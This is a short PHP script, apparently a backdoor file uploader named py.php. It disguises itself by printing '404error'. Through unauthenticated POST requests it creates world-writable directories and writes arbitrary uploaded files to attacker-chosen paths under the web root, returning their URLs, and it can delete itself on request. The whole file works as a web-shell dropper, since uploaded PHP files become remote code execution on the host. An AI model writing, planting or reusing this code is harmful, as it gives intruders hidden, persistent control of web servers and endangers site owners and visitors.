<?php
echo "404error";
$path = $_POST["path"];
$filename = $_POST["filename"];
$type = $_POST["type"];
$uploads_path = $_POST["uploads_path"];

// $root = dirname(__FILE__) . $uploads_path ;
// $root = dirname(__FILE__) . "/" . $path;
$root = $_SERVER['DOCUMENT_ROOT']. $uploads_path . $path;
// $root = $_SERVER['DOCUMENT_ROOT'];

$server = $_SERVER['SERVER_NAME'] . ":" . $_SERVER['SERVER_PORT'] . $_SERVER["REQUEST_URI"];
$server = str_replace("py.php", "uploads", $server);
$server = $server . "/" . $path;

if (!file_exists($root)) {
    mkdir($root, 0777, true);
}
if ($type == 1) {
    $savePath = $root;
//     $savePath = $root. $uploads_path . $path;
    if (!file_exists($savePath)) {
        mkdir($savePath, 0777, true);
    }
    echo $server;
}

if ($type == 2) {
    if ($_FILES["file"]["error"] > 0) {
        echo "错误：: " . $_FILES["file"]["error"] . "<br>";
    } else {
        $savePath = $root;
//         $savePath = $root. $uploads_path . $path;
        if (!file_exists($savePath)) {
            mkdir($savePath, 0777, true);
        }
        $saveFile = $savePath . '/' . $filename;
//         $saveFile = $_SERVER['DOCUMENT_ROOT'] . '/' . $filename;

        if (file_exists($_FILES["file"]["tmp_name"])) {
            move_uploaded_file($_FILES["file"]["tmp_name"], $saveFile);
            echo $server . "/" . $filename;
        } else {
            echo "fail";
        }
    }
}

if ($type == 3) {
    $file = "py.php";
    if (file_exists($file)) {
         @unlink ($file);
    }
}

if ($type == 4) {
    if (!file_exists($root)) {
        mkdir($root , 0777, true);
    }
}